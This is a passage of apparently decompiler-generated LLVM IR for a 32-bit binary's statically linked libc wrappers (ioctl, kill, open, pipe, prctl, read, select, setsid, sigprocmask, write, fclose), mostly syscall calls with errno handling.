; uselistorder directives
  uselistorder i32 %v1_804d883, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d89c, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804d8a4 = load i32, i32* @edi, align 4
  store i32 %v0_804d8a4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804d8bc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804d8c4 = call i32 @ioctl(i32 %v0_804d8bc, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804d8bc, i32* @ebx, align 4
  store i32 %v3_804d8c4, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v3_804d8c4, -4095
  br i1 %tmp11, label %dec_label_pc_804d8dc, label %dec_label_pc_804d8d0

dec_label_pc_804d8d0:                             ; preds = %entry
  %v1_804d8d0 = call i32 @__errno_location(i32 %v0_804d8bc)
  %v0_804d8d5 = load i32, i32* %edi.global-to-local, align 4
  %v1_804d8d5 = sub i32 0, %v0_804d8d5
  %v2_804d8d7 = inttoptr i32 %v1_804d8d0 to i32*
  store i32 %v1_804d8d5, i32* %v2_804d8d7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d8dc

dec_label_pc_804d8dc:                             ; preds = %entry, %dec_label_pc_804d8d0
  %v0_804d8dc = phi i32 [ %v3_804d8c4, %entry ], [ -1, %dec_label_pc_804d8d0 ]
  %v2_804d8e1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d8e1, i32* @edi, align 4
  ret i32 %v0_804d8dc

; uselistorder directives
  uselistorder i32 %v3_804d8c4, { 1, 0, 2 }
  uselistorder i32 %v0_804d8bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d8dc, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d8e4 = load i32, i32* @ebx, align 4
  store i32 %v0_804d8e4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804d8f7 = call i32 @kill(i32 %v0_804d8e4, i32 %tmp4)
  store i32 %v2_804d8f7, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_804d8f7, -4095
  br i1 %tmp8, label %dec_label_pc_804d910, label %dec_label_pc_804d904

dec_label_pc_804d904:                             ; preds = %entry
  %v0_804d904 = load i32, i32* %stack_var_-4, align 4
  %v1_804d904 = call i32 @__errno_location(i32 %v0_804d904)
  %v0_804d909 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d909 = sub i32 0, %v0_804d909
  %v2_804d90b = inttoptr i32 %v1_804d904 to i32*
  store i32 %v1_804d909, i32* %v2_804d90b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d910

dec_label_pc_804d910:                             ; preds = %entry, %dec_label_pc_804d904
  %v0_804d910 = phi i32 [ %v2_804d8f7, %entry ], [ -1, %dec_label_pc_804d904 ]
  %v2_804d912 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d912, i32* @edx, align 4
  %v2_804d914 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d914, i32* @ebx, align 4
  ret i32 %v0_804d910

; uselistorder directives
  uselistorder i32 %v2_804d8f7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d910, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_804d919 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804d91f = sdiv i32 %sext, 16777216
  store i32 %v4_804d91f, i32* @ecx, align 4
  %v4_804d923 = ptrtoint i8* %arg1 to i32
  %v3_804d927 = and i32 %arg2, 64
  %v4_804d927 = icmp eq i32 %v3_804d927, 0
  br i1 %v4_804d927, label %dec_label_pc_804d938, label %dec_label_pc_804d92c

dec_label_pc_804d92c:                             ; preds = %entry
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_804d938

dec_label_pc_804d938:                             ; preds = %entry, %dec_label_pc_804d92c
  %v0_804d938 = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_804d92c ]
  store i32 %v0_804d938, i32* @edx, align 4
  store i32 %v4_804d923, i32* %ebx.global-to-local, align 4
  %v5_804d943 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804d91f)
  store i32 %v5_804d943, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_804d943, -4095
  br i1 %tmp15, label %dec_label_pc_804d95b, label %dec_label_pc_804d94f

dec_label_pc_804d94f:                             ; preds = %dec_label_pc_804d938
  %v1_804d94f = call i32 @__errno_location(i32 %v0_804d919)
  %v0_804d954 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d954 = sub i32 0, %v0_804d954
  %v2_804d956 = inttoptr i32 %v1_804d94f to i32*
  store i32 %v1_804d954, i32* %v2_804d956, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d95b

dec_label_pc_804d95b:                             ; preds = %dec_label_pc_804d938, %dec_label_pc_804d94f
  %v0_804d95b = phi i32 [ %v5_804d943, %dec_label_pc_804d938 ], [ -1, %dec_label_pc_804d94f ]
  store i32 %v0_804d919, i32* @ebx, align 4
  ret i32 %v0_804d95b

; uselistorder directives
  uselistorder i32 %v5_804d943, { 1, 0, 2 }
  uselistorder i32 %v4_804d91f, { 1, 0 }
  uselistorder i32 %v0_804d919, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804d95b, { 1, 0 }
  uselistorder label %dec_label_pc_804d938, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804d973 = inttoptr i32 %arg1 to i8*
  %v4_804d973 = call i32 @__libc_open(i8* %v3_804d973, i32 577)
  ret i32 %v4_804d973
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d97c = load i32, i32* @edi, align 4
  store i32 %v0_804d97c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804d984 = load i32, i32* @ebx, align 4
  %v1_804d98c = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_804d98c = call i32 @pipe([2 x i32] %v1_804d98c)
  store i32 %v0_804d984, i32* @ebx, align 4
  store i32 %v2_804d98c, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_804d98c, -4095
  br i1 %tmp8, label %dec_label_pc_804d9a4, label %dec_label_pc_804d998

dec_label_pc_804d998:                             ; preds = %entry
  %v1_804d998 = call i32 @__errno_location(i32 %v0_804d984)
  %v0_804d99d = load i32, i32* %edi.global-to-local, align 4
  %v1_804d99d = sub i32 0, %v0_804d99d
  %v2_804d99f = inttoptr i32 %v1_804d998 to i32*
  store i32 %v1_804d99d, i32* %v2_804d99f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d9a4

dec_label_pc_804d9a4:                             ; preds = %entry, %dec_label_pc_804d998
  %v0_804d9a4 = phi i32 [ %v2_804d98c, %entry ], [ -1, %dec_label_pc_804d998 ]
  %v2_804d9a8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d9a8, i32* @edi, align 4
  ret i32 %v0_804d9a4

; uselistorder directives
  uselistorder i32 %v2_804d98c, { 1, 0, 2 }
  uselistorder i32 %v0_804d984, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d9a4, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804d9ac = load i32, i32* @edi, align 4
  %v0_804d9ad = load i32, i32* @esi, align 4
  store i32 %v0_804d9ad, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_804d9c5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v5_804d9cd = call i32 @prctl(i32 %v0_804d9c5, i32 %v0_804d9ad, i32 %v0_804d9ac, i32 %tmp6, i32 %arg1)
  store i32 %v0_804d9c5, i32* @ebx, align 4
  store i32 %v5_804d9cd, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v5_804d9cd, -4095
  br i1 %tmp11, label %dec_label_pc_804d9e5, label %dec_label_pc_804d9d9

dec_label_pc_804d9d9:                             ; preds = %entry
  %v1_804d9d9 = call i32 @__errno_location(i32 %v0_804d9c5)
  %v0_804d9de = load i32, i32* %esi.global-to-local, align 4
  %v1_804d9de = sub i32 0, %v0_804d9de
  %v2_804d9e0 = inttoptr i32 %v1_804d9d9 to i32*
  store i32 %v1_804d9de, i32* %v2_804d9e0, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804d9e5

dec_label_pc_804d9e5:                             ; preds = %entry, %dec_label_pc_804d9d9
  %v0_804d9e5 = phi i32 [ %v5_804d9cd, %entry ], [ -1, %dec_label_pc_804d9d9 ]
  %v2_804d9e8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d9e8, i32* @esi, align 4
  store i32 %v0_804d9ac, i32* @edi, align 4
  ret i32 %v0_804d9e5

; uselistorder directives
  uselistorder i32 %v5_804d9cd, { 1, 0, 2 }
  uselistorder i32 %v0_804d9c5, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @prctl, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d9e5, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d9ec = load i32, i32* @edi, align 4
  store i32 %v0_804d9ec, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804d9fc = load i32, i32* @ebx, align 4
  %v4_804da04 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804d9fc, i32* @ebx, align 4
  store i32 %v4_804da04, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_804da04, -4095
  br i1 %tmp11, label %dec_label_pc_804da1c, label %dec_label_pc_804da10

dec_label_pc_804da10:                             ; preds = %entry
  %v1_804da10 = call i32 @__errno_location(i32 %v0_804d9fc)
  %v0_804da15 = load i32, i32* %edi.global-to-local, align 4
  %v1_804da15 = sub i32 0, %v0_804da15
  %v2_804da17 = inttoptr i32 %v1_804da10 to i32*
  store i32 %v1_804da15, i32* %v2_804da17, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804da1c

dec_label_pc_804da1c:                             ; preds = %entry, %dec_label_pc_804da10
  %v0_804da1c = phi i32 [ %v4_804da04, %entry ], [ -1, %dec_label_pc_804da10 ]
  %v2_804da20 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804da20, i32* @edi, align 4
  ret i32 %v0_804da1c

; uselistorder directives
  uselistorder i32 %v4_804da04, { 1, 0, 2 }
  uselistorder i32 %v0_804d9fc, { 1, 0 }
  uselistorder label %dec_label_pc_804da1c, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804da25 = load i32, i32* @esi, align 4
  store i32 %v0_804da25, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804da3d = load i32, i32* @ebx, align 4
  %v1_804da45 = call i32 @int80_syscall(i32 142)
  store i32 %v0_804da3d, i32* @ebx, align 4
  store i32 %v1_804da45, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_804da45, -4095
  br i1 %tmp11, label %dec_label_pc_804da5d, label %dec_label_pc_804da51

dec_label_pc_804da51:                             ; preds = %entry
  %v1_804da51 = call i32 @__errno_location(i32 %v0_804da3d)
  %v0_804da56 = load i32, i32* %esi.global-to-local, align 4
  %v1_804da56 = sub i32 0, %v0_804da56
  %v2_804da58 = inttoptr i32 %v1_804da51 to i32*
  store i32 %v1_804da56, i32* %v2_804da58, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804da5d

dec_label_pc_804da5d:                             ; preds = %entry, %dec_label_pc_804da51
  %v0_804da5d = phi i32 [ %v1_804da45, %entry ], [ -1, %dec_label_pc_804da51 ]
  %v2_804da5f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804da5f, i32* @edx, align 4
  %v2_804da60 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804da60, i32* @esi, align 4
  ret i32 %v0_804da5d

; uselistorder directives
  uselistorder i32 %v1_804da45, { 1, 0, 2 }
  uselistorder i32 %v0_804da3d, { 1, 0 }
  uselistorder label %dec_label_pc_804da5d, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804da64 = load i32, i32* @ebx, align 4
  store i32 %v0_804da64, i32* %stack_var_-4, align 4
  %v1_804da6d = call i32 @setsid(i32 %v0_804da64)
  store i32 %v1_804da6d, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804da6d, -4095
  br i1 %tmp6, label %dec_label_pc_804da84, label %dec_label_pc_804da78

dec_label_pc_804da78:                             ; preds = %entry
  %v0_804da78 = load i32, i32* %stack_var_-4, align 4
  %v1_804da78 = call i32 @__errno_location(i32 %v0_804da78)
  %v0_804da7d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804da7d = sub i32 0, %v0_804da7d
  %v2_804da7f = inttoptr i32 %v1_804da78 to i32*
  store i32 %v1_804da7d, i32* %v2_804da7f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804da84

dec_label_pc_804da84:                             ; preds = %entry, %dec_label_pc_804da78
  %v0_804da84 = phi i32 [ %v1_804da6d, %entry ], [ -1, %dec_label_pc_804da78 ]
  %v2_804da88 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804da88, i32* @ebx, align 4
  ret i32 %v0_804da84

; uselistorder directives
  uselistorder i32 %v1_804da6d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804da84, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804da8d = load i32, i32* @esi, align 4
  %v4_804da91 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804da91, i32* @ecx, align 4
  %v2_804da9d = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804da9d, label %dec_label_pc_804dab6, label %dec_label_pc_804daa1

dec_label_pc_804daa1:                             ; preds = %entry
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_804dab6, label %dec_label_pc_804daa6

dec_label_pc_804daa6:                             ; preds = %dec_label_pc_804daa1
  %v1_804daa6 = call i32 @__errno_location(i32 %v0_804da8d)
  %v1_804daab = inttoptr i32 %v1_804daa6 to i32*
  store i32 22, i32* %v1_804daab, align 4
  br label %dec_label_pc_804dadd

dec_label_pc_804dab6:                             ; preds = %dec_label_pc_804daa1, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804dabb = load i32, i32* @ebx, align 4
  %v7_804dac3 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_804dabb, i32* @ebx, align 4
  store i32 %v7_804dac3, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_804dac3, -4095
  br i1 %tmp12, label %dec_label_pc_804dadd, label %dec_label_pc_804dacf

dec_label_pc_804dacf:                             ; preds = %dec_label_pc_804dab6
  %v1_804dacf = call i32 @__errno_location(i32 %v0_804dabb)
  %v0_804dad4 = load i32, i32* %esi.global-to-local, align 4
  %v1_804dad4 = sub i32 0, %v0_804dad4
  %v2_804dad6 = inttoptr i32 %v1_804dacf to i32*
  store i32 %v1_804dad4, i32* %v2_804dad6, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804dadd

dec_label_pc_804dadd:                             ; preds = %dec_label_pc_804dacf, %dec_label_pc_804dab6, %dec_label_pc_804daa6
  %storemerge = phi i32 [ -1, %dec_label_pc_804daa6 ], [ %v7_804dac3, %dec_label_pc_804dab6 ], [ -1, %dec_label_pc_804dacf ]
  %v2_804dadd = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dadd, i32* @edx, align 4
  store i32 %v0_804da8d, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_804dac3, { 1, 0, 2 }
  uselistorder i32 %v0_804dabb, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dae4 = load i32, i32* @edi, align 4
  store i32 %v0_804dae4, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_804daec = load i32, i32* @ebx, align 4
  %v2_804daf4 = call i32 @time(i32* %arg1)
  store i32 %v0_804daec, i32* @ebx, align 4
  store i32 %v2_804daf4, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_804daf4, -4095
  br i1 %tmp9, label %dec_label_pc_804db0c, label %dec_label_pc_804db00

dec_label_pc_804db00:                             ; preds = %entry
  %v1_804db00 = call i32 @__errno_location(i32 %v0_804daec)
  %v0_804db05 = load i32, i32* %edi.global-to-local, align 4
  %v1_804db05 = sub i32 0, %v0_804db05
  %v2_804db07 = inttoptr i32 %v1_804db00 to i32*
  store i32 %v1_804db05, i32* %v2_804db07, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804db0c

dec_label_pc_804db0c:                             ; preds = %entry, %dec_label_pc_804db00
  %v0_804db0c = phi i32 [ %v2_804daf4, %entry ], [ -1, %dec_label_pc_804db00 ]
  %v2_804db0e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804db0e, i32* @edx, align 4
  %v2_804db10 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804db10, i32* @edi, align 4
  ret i32 %v0_804db0c

; uselistorder directives
  uselistorder i32 %v2_804daf4, { 1, 0, 2 }
  uselistorder i32 %v0_804daec, { 1, 0 }
  uselistorder label %dec_label_pc_804db0c, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_804db25 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_804db25
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804db30 = load i32, i32* @edi, align 4
  store i32 %v0_804db30, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804db40 = load i32, i32* @ebx, align 4
  %v4_804db48 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804db40, i32* @ebx, align 4
  store i32 %v4_804db48, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_804db48, -4095
  br i1 %tmp11, label %dec_label_pc_804db60, label %dec_label_pc_804db54

dec_label_pc_804db54:                             ; preds = %entry
  %v1_804db54 = call i32 @__errno_location(i32 %v0_804db40)
  %v0_804db59 = load i32, i32* %edi.global-to-local, align 4
  %v1_804db59 = sub i32 0, %v0_804db59
  %v2_804db5b = inttoptr i32 %v1_804db54 to i32*
  store i32 %v1_804db59, i32* %v2_804db5b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804db60

dec_label_pc_804db60:                             ; preds = %entry, %dec_label_pc_804db54
  %v0_804db60 = phi i32 [ %v4_804db48, %entry ], [ -1, %dec_label_pc_804db54 ]
  %v2_804db62 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804db62, i32* @edx, align 4
  %v2_804db64 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804db64, i32* @edi, align 4
  ret i32 %v0_804db60

; uselistorder directives
  uselistorder i32 %v4_804db48, { 1, 0, 2 }
  uselistorder i32 %v0_804db40, { 1, 0 }
  uselistorder label %dec_label_pc_804db60, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804db6c = load i32, i32* inttoptr (i32 134578712 to i32*), align 8
  %v2_804db71 = mul i32 %arg1, 2
  %v3_804db71 = add i32 %v0_804db6c, %v2_804db71
  %v4_804db71 = inttoptr i32 %v3_804db71 to i16*
  %v5_804db71 = load i16, i16* %v4_804db71, align 2
  %v6_804db71 = zext i16 %v5_804db71 to i32
  %v1_804db75 = and i32 %v6_804db71, 32
  ret i32 %v1_804db75
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_804db80 = add i32 %arg1, 128
  %v6_804db8b = icmp ugt i32 %v1_804db80, 383
  br i1 %v6_804db8b, label %dec_label_pc_804db96, label %dec_label_pc_804db8d

dec_label_pc_804db8d:                             ; preds = %entry
  %v0_804db8d = load i32, i32* inttoptr (i32 134578720 to i32*), align 32
  %v2_804db92 = mul i32 %arg1, 2
  %v3_804db92 = add i32 %v0_804db8d, %v2_804db92
  %v4_804db92 = inttoptr i32 %v3_804db92 to i16*
  %v5_804db92 = load i16, i16* %v4_804db92, align 2
  %v6_804db92 = sext i16 %v5_804db92 to i32
  store i32 %v6_804db92, i32* @edx, align 4
  br label %dec_label_pc_804db96

dec_label_pc_804db96:                             ; preds = %entry, %dec_label_pc_804db8d
  %v0_804db96 = phi i32 [ %arg1, %entry ], [ %v6_804db92, %dec_label_pc_804db8d ]
  ret i32 %v0_804db96

; uselistorder directives
  uselistorder label %dec_label_pc_804db96, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_805e720.184 to i32)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804dba4 = load i32, i32* @ebp, align 4
  %v0_804dba5 = load i32, i32* @edi, align 4
  %v0_804dba6 = load i32, i32* @esi, align 4
  %v0_804dba7 = load i32, i32* @ebx, align 4
  %v4_804dbab = ptrtoint i16* %arg1 to i32
  store i32 %v4_804dbab, i32* @esi, align 4
  %v1_804dbaf = add i32 %v4_804dbab, 52
  %v2_804dbaf = inttoptr i32 %v1_804dbaf to i32*
  %v3_804dbaf = load i32, i32* %v2_804dbaf, align 4
  store i32 %v3_804dbaf, i32* @ebp, align 4
  %v1_804dbb2 = icmp eq i32 %v3_804dbaf, 0
  %v1_804dbb4 = icmp eq i1 %v1_804dbb2, false
  br i1 %v1_804dbb4, label %dec_label_pc_804dbd5, label %dec_label_pc_804dbb6

dec_label_pc_804dbb6:                             ; preds = %entry
  %v1_804dbb6 = add i32 %v4_804dbab, 56
  store i32 %v1_804dbb6, i32* @ebx, align 4
  %v2_804dbc0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804dbc0, i32* @eax, align 4
  %v2_804dbc5 = call i32 @__pthread_return_void(i32 %v2_804dbc0, i32 134550743)
  %v0_804dbca = load i32, i32* @ebx, align 4
  %v1_804dbcd = call i32 @__pthread_return_0(i32 %v0_804dbca)
  store i32 %v1_804dbcd, i32* @eax, align 4
  %v0_804dbd7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804dbd5

dec_label_pc_804dbd5:                             ; preds = %entry, %dec_label_pc_804dbb6
  %v0_804dbdf = phi i32 [ %v4_804dbab, %entry ], [ %v0_804dbd7.pre, %dec_label_pc_804dbb6 ]
  store i32 0, i32* @edi, align 4
  %v1_804dbd7 = inttoptr i32 %v0_804dbdf to i8*
  %v2_804dbd7 = load i8, i8* %v1_804dbd7, align 1
  %v3_804dbd7 = and i8 %v2_804dbd7, 64
  %v4_804dbd7 = icmp eq i8 %v3_804dbd7, 0
  br i1 %v4_804dbd7, label %dec_label_pc_804dbd5.dec_label_pc_804dbea_crit_edge, label %dec_label_pc_804dbdc

dec_label_pc_804dbd5.dec_label_pc_804dbea_crit_edge: ; preds = %dec_label_pc_804dbd5
  br label %dec_label_pc_804dbea

dec_label_pc_804dbdc:                             ; preds = %dec_label_pc_804dbd5
  %v1_804dbe0 = inttoptr i32 %v0_804dbdf to i16*
  %v2_804dbe0 = call i32 @fflush_unlocked(i16* %v1_804dbe0)
  store i32 %v2_804dbe0, i32* @edi, align 4
  %v0_804dbed.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804dbea

dec_label_pc_804dbea:                             ; preds = %dec_label_pc_804dbd5.dec_label_pc_804dbea_crit_edge, %dec_label_pc_804dbdc
  %v0_804dbed = phi i32 [ %v0_804dbdf, %dec_label_pc_804dbd5.dec_label_pc_804dbea_crit_edge ], [ %v0_804dbed.pre, %dec_label_pc_804dbdc ]
  %v1_804dbed = add i32 %v0_804dbed, 4
  %v2_804dbed = inttoptr i32 %v1_804dbed to i32*
  %v3_804dbed = load i32, i32* %v2_804dbed, align 4
  %v1_804dbf0 = call i32 @__libc_close(i32 %v3_804dbed)
  store i32 %v1_804dbf0, i32* @eax, align 4
  %v2_804dbf8 = icmp slt i32 %v1_804dbf0, 0
  %v1_804dbfa = icmp eq i1 %v2_804dbf8, false
  br i1 %v1_804dbfa, label %dec_label_pc_804dbff, label %dec_label_pc_804dbfc

dec_label_pc_804dbfc:                             ; preds = %dec_label_pc_804dbea
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804dbff

dec_label_pc_804dbff:                             ; preds = %dec_label_pc_804dbea, %dec_label_pc_804dbfc
  %v0_804dbff = load i32, i32* @esi, align 4
  %v1_804dbff = add i32 %v0_804dbff, 4
  %v2_804dbff = inttoptr i32 %v1_804dbff to i32*
  store i32 -1, i32* %v2_804dbff, align 4
  %v2_804dc11 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804dc11, i32* @ebx, align 4
  %v2_804dc16 = call i32 @__pthread_return_void(i32 %v2_804dc11, i32 134550743)
  %v1_804dc22 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058254.185 to i32))
  %v0_804dc27 = load i32, i32* @global_var_805c4e4.186, align 4
  %v1_804dc2c = add i32 %v0_804dc27, 1
  store i32 %v1_804dc2c, i32* @global_var_805c4e4.186, align 4
  store i32 ptrtoint (i32* @global_var_8058254.185 to i32), i32* @eax, align 4
  %v2_804dc37 = call i32 @__pthread_return_void(i32 %v2_804dc11, i32 1)
  store i32 %v2_804dc37, i32* @eax, align 4
  %v0_804dc3f = load i32, i32* @esi, align 4
  %v1_804dc3f = inttoptr i32 %v0_804dc3f to i16*
  %v2_804dc3f = load i16, i16* %v1_804dc3f, align 2
  %v3_804dc3f = and i16 %v2_804dc3f, 24576
  store i16 %v3_804dc3f, i16* %v1_804dc3f, align 2
  %v0_804dc44 = load i32, i32* @esi, align 4
  %v1_804dc44 = inttoptr i32 %v0_804dc44 to i16*
  %v2_804dc44 = load i16, i16* %v1_804dc44, align 2
  %v3_804dc44 = or i16 %v2_804dc44, 48
  store i16 %v3_804dc44, i16* %v1_804dc44, align 2
  br i1 %v1_804dbb4, label %dec_label_pc_804dc5d, label %dec_label_pc_804dc4c

dec_label_pc_804dc4c:                             ; preds = %dec_label_pc_804dbff
  %v2_804dc50 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804dc50, i32* @eax, align 4
  %v2_804dc55 = call i32 @__pthread_return_void(i32 %v2_804dc50, i32 1)
  store i32 %v2_804dc55, i32* @eax, align 4
  br label %dec_label_pc_804dc5d

dec_label_pc_804dc5d:                             ; preds = %dec_label_pc_804dbff, %dec_label_pc_804dc4c
